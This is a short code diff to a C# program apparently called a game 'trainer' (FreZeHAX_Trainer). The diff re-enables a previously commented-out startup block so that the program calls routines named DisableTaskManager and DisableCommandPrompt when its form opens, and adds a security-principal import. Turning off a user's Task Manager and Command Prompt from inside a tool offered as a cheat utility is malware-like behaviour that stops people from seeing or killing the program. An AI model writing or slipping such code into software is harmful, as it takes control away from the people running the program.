@@ -7,6 +7,7 @@ using System.IO;
 using System.Linq;
 using System.Management;
 using System.Net.NetworkInformation;
+using System.Security.Principal;
 using System.Text.RegularExpressions;
 using System.Windows.Forms;
 using System.Windows.Input;
@@ -63,7 +64,7 @@ namespace FreZeHAX_Trainer
         {
             Show();
             StartForm();
-            /*others.DisableTaskManager();
+            others.DisableTaskManager();
             others.DisableCommandPrompt();
             others.Wait(1000);
 
@@ -103,7 +104,7 @@ namespace FreZeHAX_Trainer
             }
             catch (Exception) { }
             #endregion
-            */
+
             Auto_Attach.RunWorkerAsync();
 
             foreach (NetworkInterface adapter in NetworkInterface.GetAllNetworkInterfaces().Where(
